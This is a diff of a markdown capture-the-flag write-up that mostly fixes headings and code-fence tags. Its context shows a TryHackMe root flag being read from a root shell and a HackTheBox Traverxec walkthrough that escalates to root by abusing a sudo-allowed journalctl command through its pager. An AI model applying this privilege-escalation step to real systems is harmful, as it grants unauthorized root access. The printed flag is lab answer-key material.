@@ -223,15 +223,13 @@ uid=0(root) gid=0(root) groups=0(root)
 # cat root.txt
 THM{6637f41d0177b6f37cb20d775124699f}
 ```
-## tryhackme linux privlege escalation arena()80 different SUID binaries(80 different priv esc methods):
+## tryhackme linux privlege escalation arena(80 different SUID binaries)(80 different priv esc methods):
 
 ## priv esc with journalctl -  hack the box traverxec root:
 
 We find an interesting file in `bin` called `server-stats.sh` so we run it to see what its doing.
 
-```#!/usr/bin/env bash
-
-#!/usr/bin/env bash
+```bash
 david@traverxec:~/bin$ bash server-stats.sh
                                                                           .----.
                                                               .---------. | == |
@@ -258,7 +256,8 @@ Apr 10 23:47:56 traverxec sudo[4133]: www-data : command not allowed ; TTY=pts/7
 Apr 10 23:47:56 traverxec crontab[4194]: (www-data) LIST (www-data)
 ```
 we can see that it is outputting some kind of logs so we take a look at the file to see exactly what its doing.
-```#!/usr/bin/env bash
+
+```bash
 #!/bin/bash
 
 cat /home/david/bin/server-stats.head
@@ -273,13 +272,13 @@ echo "Last 5 journal log lines:"
 We can see on the top line that it is reading the head for `server-stats` which is the ascii art and the copyright.
 
 But at the bottom is the part that is running as root(sudo)
-```#!/usr/bin/env bash
+```bash
 /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat
 ```
 This tells us that we can run `journalctl` as root.
 
 We can do a quick search on gtfobins which tells us that we can use it to execute a shell if our window is minimal.
-```#!/usr/bin/env bash
+```bash
 avid@traverxec:~$ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
 -- Logs begin at Thu 2020-04-09 19:07:20 EDT, end at Sat 2020-04-11 01:14:31 EDT. --
 Apr 10 23:47:54 traverxec sudo[4133]: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 tty=/dev/pts/7 ruser=www-data rhost=  user=w
